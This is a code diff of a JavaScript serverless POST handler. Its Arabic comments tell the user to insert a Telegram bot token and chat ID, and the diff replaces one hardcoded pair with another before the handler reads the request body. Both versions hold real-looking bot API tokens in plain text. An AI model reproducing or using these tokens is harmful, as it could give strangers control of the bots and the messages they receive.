@@ -7,10 +7,10 @@ export default async function handler(req, res) {
   if (req.method !== 'POST') return res.status(405).json({ error: 'Method Not Allowed' });
 
   // ضع هنا توكن البوت الجديد الذي أخذته من BotFather
-  const BOT_TOKEN = "9011285196:AAFLcMJppnOU51HosR3g1ujHC4Vx0HVtXTg";
+  const BOT_TOKEN = "8704506100:AAG1IvxmDba-3v90ujm2ZCc765EROT0T8Qc";
   
   // ضع هنا الـ Chat ID الخاص بك على تليجرام
-  const CHAT_ID = "9011285196";
+  const CHAT_ID = "8040433133";
   
   const data = req.body;
 
